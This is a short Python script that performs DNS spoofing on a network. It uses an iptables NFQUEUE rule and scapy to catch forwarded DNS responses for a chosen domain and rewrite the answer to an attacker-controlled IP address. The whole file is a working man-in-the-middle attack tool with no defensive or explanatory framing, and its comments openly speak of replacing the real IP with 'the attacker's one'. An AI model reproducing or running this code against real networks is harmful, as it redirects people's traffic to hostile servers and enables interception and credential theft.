import netfilterqueue
import scapy.all as scapy
import os

website = "www.hello.com"
ip = "0.0.0.0"

def spoof_packet(packet):
    # converting packet to scapy packet
    dns_packet = scapy.IP(packet.get_payload())
    # if has DNS Resource Record layer data
    if dns_packet.haslayer(scapy.DNS):
        # getting DNS requested website name
        qname = dns_packet[scapy.DNSQR].qname
        print("[+] Got DNS request: " + qname)
        # if the DNS requested website name is the one that we want
        if website in qname:
            # modify request
            # replace the original ip with the attacker's one
            dns_response = scapy.DNSRR(rrname=qname, rdata=ip)
            # ?
            dns_packet[scapy.DNS].an = dns_response
            dns_packet[scapy.DNS].ancount = 1
            # removing original checksum because we changed the packet. Scapy will generate it automatically
            # For UDP and TCP
            del dns_packet[scapy.IP].len
            del dns_packet[scapy.IP].chksum
            del dns_packet[scapy.UDP].len
            del dns_packet[scapy.UDP].chksum
            # repack
            packet.set_payload(str(dns_packet))
    # send
    packet.accept()


try:
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, spoof_packet)
    print("Spoofing...")
    queue.run()
except KeyboardInterrupt:
    print("[+] Stopped")
    os.system("iptables --flush")
